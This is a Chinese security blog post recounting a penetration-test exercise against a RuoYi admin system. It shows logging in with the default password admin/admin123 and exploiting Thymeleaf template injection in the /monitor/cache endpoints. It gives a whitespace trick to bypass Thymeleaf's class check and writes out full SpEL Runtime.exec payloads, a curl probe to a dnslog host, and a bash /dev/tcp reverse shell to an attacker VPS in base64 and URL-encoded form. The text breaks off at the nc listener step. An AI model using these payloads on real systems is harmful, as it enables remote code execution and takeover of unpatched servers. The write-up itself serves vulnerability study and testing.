---
title: 记一次攻防演练中的若依（thymeleaf 模板注入）getshell
url: https://www.secpulse.com/archives/205071.html
source: 安全脉搏
date: 2025-01-21
fetch_date: 2025-10-06T20:04:35.702226
---

# 记一次攻防演练中的若依（thymeleaf 模板注入）getshell

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# 记一次攻防演练中的若依（thymeleaf 模板注入）getshell

[漏洞](https://www.secpulse.com/archives/category/vul)

[蚁景网安实验室](https://www.secpulse.com/newpage/author?author_id=37244)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng2.png)

2025-01-20

28,697

记一次攻防演练中幸运的从若依弱口令到后台getshell的过程和分析。

# 0x01 漏洞发现

首先，我会先把目标的二级域名拿去使用搜索引擎来搜索收集到包含这个目标二级域名的三级域名或者四级域名的网站。

这样子可以快速的定位到你所要测试的漏洞资产。

**1、推荐三个比较实用的搜索引擎：**

奇安信-鹰图平台：<https://hunter.qianxin.com/>

360-quake: <https://quake.360.net/>

fofa: <https://fofa.info/>

**搜索语法：domain="二级域名"**

**2、通过一番搜索查找翻阅，幸运女神光顾~~~。**

通过搜索引擎搜索到包含目标的二级域名找到关于目标的的一个三级域名，而且还是漏洞百出的若依系统。

**经典：你若不离不弃，我必生死相依**

![image-20240411143521002](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202405241509039.png)

基于SpringBoot的权限管理系统，核心技术采用Spring、MyBatis、Shiro没有任何其它重度依赖

![image-20240411143721238](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202405241509041.png)

# 0x02 漏洞分析

**Thymeleaf模板注入漏洞简介**

Thymeleaf模板注入形成原因，简单来说，在Thymeleaf模板文件中使用th:fragment、 ， th:text 这类标签属性包含的内容会被渲染处理。并且在Thymeleaf渲染过程中使用 ${...} 或其他表达式中时内容会被Thymeleaf EL引擎执行。因此我们将攻击语句插入到 ${...} 表达式中，会触发Thymeleaf模板注入漏洞。如果带有 @ResponseBody 注解和 @RestController 注解则不能触发模板注入漏洞。因为@ResponseBody 和 @RestController 不会进行View解析而是直接返回。所以这同样是修复方式。

**漏洞点**

Server-Side Template Injection简称SSTI，也就是服务器端模板注入。

我们在审计模板注入（SSTI）漏洞时，主要查看所使用的模板引擎是否有接受用户输入的地方。主要关注xxxController层代码。在Controller层，我们关注两点：1、URL路径可控。2、return内容可控。所谓可控，也就是接受输入。

**1、URL路径可控**

```
@RequestMapping("/hello")
public class HelloController {
  @RequestMapping("/whoami/{name}/{sex}")
  public String hello(@PathVariable("name") String name,
@PathVariable("sex") String sex){
    return "Hello" + name + sex;
  }
}
```

**return内容可控**

```
@PostMapping("/getNames")
public String getCacheNames(String fragment, ModelMap mmap)
{
  mmap.put("cacheNames", cacheService.getCacheNames());
  return prefix + "/cache::" + fragment;
}
return内容可控：
\_\_${new
java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("whoami").getI
nputStream()).next()}\_\_::.x
URL路径可控：
\_\_${T(java.lang.Runtime).getRuntime().exec("touch test")}\_\_::.x
```

**2、Ruoyi使用了thymeleaf-spring5，其中四个接口方法中设置了片段选择器：**

<http://xxxxxx/monitor/cache/getNames>

<http://xxxxxx/monitor/cache/getKeys>

<http://xxxxxx/monitor/cache/getValue>

<http://xxxxxx/demo/form/localrefresh/task>

通过这四段接口，可以指定任意fragment，以/monitor/cache/getNames接口为例，controller代码如下：

```
@PostMapping("/getNames")
public String getCacheNames(String fragment, ModelMap mmap)
{
    mmap.put("cacheNames", cacheService.getCacheNames());
    return prefix + "/cache::" + fragment;
}
```

**简单理解：接收到 fragment 后，在return处进行了模板路径拼接。根据代码我们知道根路径为 /monitor/cache ，各个接口路径分别为 /getNames ， /getKeys ， /getValue ，请求参数均为fragment 。**

这四段接口方法中，都使用了thymeleaf的语法：

```
"/xxx::" + fragment;
```

我们构造fragment的值为：

```
url编码：
%24%7b%54%20%28%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%29%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%75%72%6c%20%64%6e%73%6c%6f%67%30%40%22%29%7d
                    ↓
${T (java.lang.Runtime).getRuntime().exec("curl dnslog地址")}
```

当我们构造的模板片段被thymeleaf解析时，thymeleaf会将识别出fragment为SpringEL表达式。不管是?fragment=header(payload)还是?fragment=payload

![image-20240411143949013](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202405241509042.png)

但是，在执行SpringEL表达式之前，thymeleaf会去检查参数值中是否使用了"T(SomeClass)"或者"new SomeClass"

![image-20240411144014914](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202405241509043.png)

> 这个检查方法其实可以绕过，SpringEL表达式支持"T (SomeClass)"这样的语法，因此我们只要在T与恶意Class之间加个空格，就既可以绕过thymeleaf的检测规则，又可以执行SpringEL表达式。
>
> 因此payload中**T与恶意Class之间含有空格**，不论是空格或者制表符都可以绕过检测。

漏洞影响：RuoYi <= v4.7.1

# 0x03 开始战斗

1、回到之前的若依登录框，若依的管理系统肯定要试试看弱口令啦，用户admin，密码admin123。

![image-20240411130206602](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202405241509044.png)

非常nice，弱口令yyds，登录进入若依系统后台。

![image-20240411130435483](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202405241509045.png)

经过一番测试，后台定时任务执行不了命令，反弹shell不成功，更换了几个不同的payload都没效果，太菜了，咱也不知道为什么，其他的常见的漏洞任意文件读取、SQL注入、未授权访问啥的都没有，所以才会来测试一番**Thymeleaf模板注入**远程命令执行。

这**四个接口路径**都可以访问，我们使用第一个接口路径进行测试。

```
/monitor/cache/getNames

/monitor/cache/getKeys

/monitor/cache/getValue

/demo/form/localrefresh/task
```

![image-20240411130537524](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202405241509046.png)

2、在若依管理系统后台直接访问/monitor/cache/getNames接口路径，使用burp suite拦截访问/monitor/cache/getNames路径的数据包。

访问/monitor/cache/getNames

![image-20240411143414247](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202405241509047.png)

使用burp suite拦截数据包

![image-20240411132629456](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202405241509048.png)

使用burp suite上自带的编码工具，使用base64编码反弹shell命令

```
/bin/bash -i >& /dev/tcp/vps IP/5566 0>&1
```

![image-20240411131819185](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202405241509049.png)

构造fragment的值，把上面使用base64的编码放入下面的payload编码成url编码

```
${T (java.lang.Runtime).getRuntime().exec("bash \-c {echo,L2Jpbi9iYXNooC1poD4moC9kZXYvdGNwL3ZwcyBJUC81NTY2oDA+JjE=}|{base64,-d}|{bash,-i}")}
```

![image-20240411131912908](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202405241509051.png)

把前面拦截到的访问/monitor/cache/getNames路径的数据包**更改请求方式为POST**，更改完请求方式后在访问路径后面**拼接上我们刚刚经过url编码构造fragment的值**。

![image-20240411132524501](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202405241509052.png)

```
/monitor/cache/getNames?fragment=%24%7b%54%20%28%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%29%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%62%61%73%68%a0%5c%2d%63%20%7b%65%63%68%6f%2c%4c%32%4a%70%62%69%39%69%59%58%4e%6f%6f%43%31%70%6f%44%34%6d%6f%43%39%6b%5a%58%59%76%64%47%4e%77%4c%33%5a%77%63%79%42%4a%55%43%38%31%4e%54%59%32%6f%44%41%2b%4a%6a%45%3d%7d%7c%7b%62%61%73%65%36%34%2c%2d%64%7d%7c%7b%62%61%73%68%2c%2d%69%7d%22%29%7d
```

3、在vps上面使用nc监听5566端口，接收反弹shell。...